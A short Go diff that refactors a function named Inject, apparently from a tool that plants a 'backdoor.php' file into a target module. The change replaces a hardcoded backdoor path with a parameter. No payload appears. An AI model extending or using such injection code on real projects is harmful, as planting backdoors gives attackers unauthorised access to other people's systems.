@@ -2,7 +2,6 @@ package internals
 
 import (
 	"fmt"
-	"os"
 	"strings"
 
 	"data"
@@ -18,9 +17,7 @@ func findModuleName(path string) string {
 	return pathSplitted[len(pathSplitted) - 1]
 }
 
-func Inject(addr data.Address, path string) error {
-	currentDirectory, _ := os.Getwd()
-	var backdoorPath string = currentDirectory + "/backdoor.php"
+func Inject(addr data.Address, backdoorPath string, path string) error {
 	var moduleName string = findModuleName(path)
 
 	mainFile, err := findMainFileDirectory(path, moduleName)
